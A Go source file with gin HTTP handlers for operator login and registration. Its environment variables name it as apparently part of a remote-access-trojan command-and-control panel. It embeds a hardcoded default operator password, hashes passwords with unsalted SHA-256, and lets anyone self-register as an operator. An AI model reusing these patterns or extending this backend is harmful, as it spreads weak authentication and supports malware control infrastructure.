package api

import (
	"crypto/sha256"
	"crypto/subtle"
	"encoding/hex"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"net/http"
)

const (
	operatorUser = "chemical"
	operatorPass = "K7mP9xQ2wL4nR8vT3yB6cF1hJ5sD0gA9uE2iO4zX"
)

type operatorRow struct {
	ID       string `db:"id"`
	Username string `db:"username"`
	Password string `db:"password"`
	Email    string `db:"email"`
}

var (
	tokenMu sync.Mutex
	tokens  = map[string]string{} // token -> username
)

func hashPass(p string) string {
	s := sha256.Sum256([]byte(p))
	return hex.EncodeToString(s[:])
}

func ownerUser() string {
	if v := strings.TrimSpace(os.Getenv("RATC2_OPERATOR_USER")); v != "" {
		return v
	}
	return operatorUser
}

func ownerPass() string {
	if v := strings.TrimSpace(os.Getenv("RATC2_OPERATOR_PASS")); v != "" {
		return v
	}
	return operatorPass
}

func issueToken(username string) string {
	t := uuid.New().String()
	tokenMu.Lock()
	tokens[t] = username
	tokenMu.Unlock()
	return t
}

func ensureOperatorsTable() {
	if db == nil {
		return
	}
	_, _ = db.Exec(`
		CREATE TABLE IF NOT EXISTS operators (
			id TEXT PRIMARY KEY,
			username TEXT UNIQUE NOT NULL,
			password TEXT NOT NULL,
			email TEXT,
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`)
}

func lookupOperator(username string) (operatorRow, bool) {
	ensureOperatorsTable()
	if db == nil {
		return operatorRow{}, false
	}
	var row operatorRow
	err := db.Get(&row, `SELECT id, username, password, email FROM operators WHERE username = ?`, username)
	return row, err == nil
}

func loginHandler(c *gin.Context) {
	var req struct {
		Username string `json:"username" binding:"required"`
		Password string `json:"password" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	u := strings.TrimSpace(req.Username)
	p := req.Password
	ok := false
	if strings.EqualFold(u, ownerUser()) {
		a := []byte(p)
		b := []byte(ownerPass())
		if len(a) == len(b) && subtle.ConstantTimeCompare(a, b) == 1 {
			ok = true
		}
	}
	if !ok {
		if row, found := lookupOperator(u); found && row.Password == hashPass(p) {
			ok = true
			u = row.Username
		}
	}
	if !ok {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"token": issueToken(u),
		"user":  gin.H{"username": u},
	})
}

func registerHandler(c *gin.Context) {
	var req struct {
		Username string `json:"username" binding:"required"`
		Password string `json:"password" binding:"required"`
		Email    string `json:"email"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	u := strings.TrimSpace(req.Username)
	if len(u) < 3 || len(req.Password) < 8 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "username >= 3 chars, password >= 8"})
		return
	}
	if strings.EqualFold(u, "admin") || strings.EqualFold(u, ownerUser()) {
		c.JSON(http.StatusConflict, gin.H{"error": "username taken"})
		return
	}
	ensureOperatorsTable()
	if db == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "no database"})
		return
	}
	id := uuid.New().String()
	_, err := db.Exec(`INSERT INTO operators (id, username, password, email, created_at) VALUES (?, ?, ?, ?, ?)`,
		id, u, hashPass(req.Password), strings.TrimSpace(req.Email), time.Now())
	if err != nil {
		c.JSON(http.StatusConflict, gin.H{"error": "username taken"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"token": issueToken(u),
		"user":  gin.H{"username": u, "email": req.Email},
	})
}
